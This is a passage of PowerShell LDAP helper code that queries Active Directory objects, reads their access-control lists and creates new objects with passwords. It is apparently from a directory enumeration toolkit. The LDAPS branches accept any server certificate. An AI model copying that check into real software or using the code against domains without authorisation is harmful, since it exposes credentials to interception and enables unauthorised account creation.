                $searcher.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
                if ($Credential.UserName) {
                    $searcher.Bind($Credential)
                }
                else {
                    $searcher.Bind()
                }
                if ($Properties -ne '*') {
                    $request = New-Object -TypeName DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope, $Properties)
                }
                else {
                    $request = New-Object -TypeName DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope)
                }
                $pageRequestControl = New-Object -TypeName DirectoryServices.Protocols.PageResultRequestControl -ArgumentList $PageSize
                $request.Controls.Add($pageRequestControl) | Out-Null
                $response = $searcher.SendRequest($request)
                while ($true) {
                    $response = $searcher.SendRequest($request)
                    if ($response.ResultCode -eq 'Success') {
                        foreach ($entry in $response.Entries) {
                            $results += $entry
                        }
                    }
                    $pageResponseControl = [DirectoryServices.Protocols.PageResultResponseControl]$response.Controls[0]
                    if ($pageResponseControl.Cookie.Length -eq 0) {
                        break
                    }
                    $pageRequestControl.Cookie = $pageResponseControl.Cookie
                }
            }
            else {
                $adsPath = "LDAP://$Server/$SearchBase"
                if ($Credential.UserName) {
                    $domainObject = New-Object -TypeName DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                    $searcher = New-Object -TypeName DirectoryServices.DirectorySearcher($domainObject)
                }
                else {
                    $searcher = New-Object -TypeName DirectoryServices.DirectorySearcher([ADSI]$adsPath)
                }
                $searcher.SearchScope = $SearchScope
                $searcher.PageSize = $PageSize
                $searcher.CacheResults = $false
                $searcher.filter = $Filter
                $propertiesToLoad = $Properties | ForEach-Object {$_.Split(',')}
                $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
                $results = $searcher.FindAll()
            }
        }
        catch {
            Write-Error $_
            continue
        }

        if ($Raw) {
            $results
        }
        else {
            $results | Where-Object {$_} | ForEach-Object {
                if (Get-Member -InputObject $_ -name "Attributes" -Membertype Properties) {
                    # Convert DirectoryAttribute object (LDAPS results)
                    $p = @{}
                    foreach ($a in $_.Attributes.Keys | Sort-Object) {
                        if (($a -eq 'objectsid') -or ($a -eq 'sidhistory') -or ($a -eq 'objectguid') -or ($a -eq 'securityidentifier') -or ($a -eq 'msds-allowedtoactonbehalfofotheridentity') -or ($a -eq 'usercertificate') -or ($a -eq 'ntsecuritydescriptor') -or ($a -eq 'logonhours')) {
                            $p[$a] = $_.Attributes[$a]
                        }
                        elseif ($a -eq 'dnsrecord') {
                            $p[$a] = ($_.Attributes[$a].GetValues([byte[]]))[0]
                        }
                        elseif (($a -eq 'whencreated') -or ($a -eq 'whenchanged')) {
                            $value = ($_.Attributes[$a].GetValues([byte[]]))[0]
                            $format = "yyyyMMddHHmmss.fZ"
                            $p[$a] = [datetime]::ParseExact([Text.Encoding]::UTF8.GetString($value), $format, [cultureinfo]::InvariantCulture)
                        }
                        else {
                            $values = @()
                            foreach ($v in $_.Attributes[$a].GetValues([byte[]])) {
                                $values += [Text.Encoding]::UTF8.GetString($v)
                            }
                            $p[$a] = $values
                        }
                    }
                }
                else {
                    $p = $_.Properties
                }
                $objectProperties = @{}
                $p.Keys | ForEach-Object {
                    if (($_ -ne 'adspath') -and ($p[$_].count -eq 1)) {
                        $objectProperties[$_] = $p[$_][0]
                    }
                    elseif ($_ -ne 'adspath') {
                        $objectProperties[$_] = $p[$_]
                    }
                }
                New-Object -TypeName PSObject -Property ($objectProperties)
            }
        }
    }

    End {
        if ($results -and -not $SSL) {
            $results.dispose()
        }
        if ($searcher) {
            $searcher.dispose()
        }
    }
}

Function Local:Get-LdapObjectAcl {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBase,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateNotNullOrEmpty()]
        [String]
        $Filter = '(objectClass=domain)',

        [ValidateRange(1,10000)] 
        [Int]
        $PageSize = 200,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    Begin {
        if ((-not $SearchBase) -or $SSL) {
            # Get default naming context
            try {
                $rootDSE = Get-LdapRootDSE -Server $Server
                $defaultNC = $rootDSE.defaultNamingContext[0]
            }
            catch {
                Write-Error "Domain controller unreachable"
                continue
            }
            if (-not $SearchBase) {
                $SearchBase = $defaultNC
            }
        }
        $securityMasks = @([DirectoryServices.SecurityMasks]::Dacl)
    }

    Process {
        try {
            if ($SSL) {
                $domain = $defaultNC -replace 'DC=' -replace ',','.'
                [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
                $searcher = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
                $searcher.SessionOptions.SecureSocketLayer = $true
                $searcher.SessionOptions.VerifyServerCertificate = {$true}
                $searcher.SessionOptions.DomainName = $domain
                $searcher.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
                if ($Credential.UserName) {
                    $searcher.Bind($Credential)
                }
                else {
                    $searcher.Bind()
                }
                $request = New-Object -TypeName DirectoryServices.Protocols.SearchRequest($SearchBase, $Filter, $SearchScope)
                $pageRequestControl = New-Object -TypeName DirectoryServices.Protocols.PageResultRequestControl -ArgumentList $PageSize
                $request.Controls.Add($pageRequestControl) | Out-Null
                $sdFlagsControl = New-Object -TypeName DirectoryServices.Protocols.SecurityDescriptorFlagControl -ArgumentList $securityMasks
                $request.Controls.Add($sdFlagsControl) | Out-Null
                $response = $searcher.SendRequest($request)
                $results = @()
                while ($true) {
                    $response = $searcher.SendRequest($request)
                    if ($response.ResultCode -eq 'Success') {
                        foreach ($entry in $response.Entries) {
                            $results += $entry
                        }
                    }
                    $pageResponseControl = [DirectoryServices.Protocols.PageResultResponseControl]$response.Controls[0]
                    if ($pageResponseControl.Cookie.Length -eq 0) {
                        break
                    }
                    $pageRequestControl.Cookie = $pageResponseControl.Cookie
                }
            }
            else {
                $adsPath = "LDAP://$Server/$SearchBase"
                if ($Credential.UserName) {
                    $domainObject = New-Object -TypeName DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
                    $searcher = New-Object -TypeName DirectoryServices.DirectorySearcher($domainObject)
                }
                else {
                    $searcher = New-Object -TypeName DirectoryServices.DirectorySearcher([ADSI]$adsPath)
                }
                $searcher.SearchScope = $SearchScope
                $searcher.PageSize = $PageSize
                $searcher.CacheResults = $false
                $searcher.filter = $Filter
                $propertiesToLoad = 'objectsid', 'ntsecuritydescriptor', 'distinguishedname'
                $searcher.PropertiesToLoad.AddRange($propertiesToLoad) | Out-Null
                $searcher.SecurityMasks = $securityMasks
                $results = $searcher.FindAll()
            }
        }
        catch {
            Write-Error $_
            continue
        }

        $results | Where-Object {$_} | ForEach-Object {
            if (Get-Member -InputObject $_ -name "Attributes" -Membertype Properties) {
                # Convert DirectoryAttribute object (LDAPS results)
                $p = @{}
                foreach ($a in $_.Attributes.Keys | Sort-Object) {
                    if (($a -eq 'objectsid') -or ($a -eq 'securityidentifier') -or ($a -eq 'ntsecuritydescriptor')) {
                        $p[$a] = $_.Attributes[$a]
                    }
                    else {
                        $values = @()
                        foreach ($v in $_.Attributes[$a].GetValues([byte[]])) {
                            $values += [Text.Encoding]::UTF8.GetString($v)
                        }
                        $p[$a] = $values
                    }
                }
            }
            else {
                $p = $_.Properties
            }
            try {
                New-Object -TypeName Security.AccessControl.RawSecurityDescriptor -ArgumentList $p['ntsecuritydescriptor'][0], 0 | ForEach-Object { $_.DiscretionaryAcl } | ForEach-Object {
                    $_ | Add-Member NoteProperty 'ObjectDN' $p.distinguishedname[0]
                    $_ | Add-Member NoteProperty 'ActiveDirectoryRights' ([Enum]::ToObject([DirectoryServices.ActiveDirectoryRights], $_.AccessMask))
                    Write-Output $_
                }
            }
            catch {}
        }
    }

    End {
        if ($results -and -not $SSL) {
            $results.dispose()
        }
        if ($searcher) {
            $searcher.dispose()
        }
    }
}

Function Local:New-LdapObject {
    Param (
        [ValidateNotNullOrEmpty()]
        [String]
        $Server = $Env:USERDNSDOMAIN,

        [Switch]
        $SSL,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [String]
        $DistinguishedName,

        [Parameter(Mandatory=$true)]
        [ValidateNotNullOrEmpty()]
        [string]
        $Class,

        [ValidateNotNullOrEmpty()]
        [hashtable]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Management.Automation.PSCredential]
        [Management.Automation.Credential()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    $objectDN = $null

    if ($SSL) {
        try {
            # Get default naming context
            $rootDSE = Get-LdapRootDSE -Server $Server
            $defaultNC = $rootDSE.defaultNamingContext[0]
            $domain = $defaultNC -replace 'DC=' -replace ',','.'

            [Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols") | Out-Null
            $connection = New-Object -TypeName DirectoryServices.Protocols.LdapConnection -ArgumentList "$($Server):636"
            $connection.SessionOptions.SecureSocketLayer = $true
            $connection.SessionOptions.VerifyServerCertificate = {$true}
            $connection.SessionOptions.DomainName = $domain
            $connection.AuthType = [DirectoryServices.Protocols.AuthType]::Negotiate
            if ($Credential.UserName) {
                $connection.Bind($Credential)
            }
            else {
                $connection.Bind()
            }

            Write-Verbose "Attempting to create object $DistinguishedName..."
            $request = New-Object -TypeName DirectoryServices.Protocols.AddRequest
            $request.DistinguishedName = $DistinguishedName
            $request.Attributes.Add((New-Object -TypeName DirectoryServices.Protocols.DirectoryAttribute -ArgumentList "objectClass", $Class)) | Out-Null
            if ($Properties) {
                foreach ($property in $Properties.GetEnumerator()) {
                    $request.Attributes.Add((New-Object -TypeName DirectoryServices.Protocols.DirectoryAttribute -ArgumentList $property.Key, $property.Value)) | Out-Null
                }
            }

            $response = $connection.SendRequest($request)
            if ($response.ResultCode -eq 'Success') {
                $objectDN = $DistinguishedName
                Write-Verbose "Object created: $objectDN"
            }
        }
        catch {
            Write-Error $_
        }
    }
    else {
        try {
            $RDN = $DistinguishedName.Split(',')[0]
            $searchBase = $DistinguishedName -replace "^$($RDN),"
            $adsPath = "LDAP://$Server/$searchBase"
            if ($Credential.UserName) {
                $containerObject = New-Object -TypeName DirectoryServices.DirectoryEntry($adsPath, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            }
            else {
                $containerObject = New-Object -TypeName DirectoryServices.DirectoryEntry($adsPath)
            }

            Write-Verbose "Attempting to create object $DistinguishedName..."
            $newObject = $containerObject.Children.Add($RDN, $Class)
            $passwordBytes = $null
            if ($Properties) {
                foreach ($property in $Properties.GetEnumerator()) {
                    # unicodePwd can not be set in cleartext
                    if ($property.Key -ne 'unicodePwd') {
                        $newObject.Properties[$property.Key].Value = $property.Value
                    }
                    else {
                        $passwordBytes = $property.Value
                    }
                }
            }

            $newObject.CommitChanges()
            Write-Verbose "Object created: $($newObject.DistinguishedName)"

            if ($passwordBytes) {
                Write-Verbose "Attempting to set password..."
                $password = [Text.Encoding]::Unicode.GetString($passwordBytes).TrimStart('"').TrimEnd('"')
                $newObject.Invoke("SetPassword", $password)
            }
            $newObject.CommitChanges()

            $objectDN = $newObject.DistinguishedName
        }
        catch {
            Write-Error $_
        }
    }

    return $objectDN
}
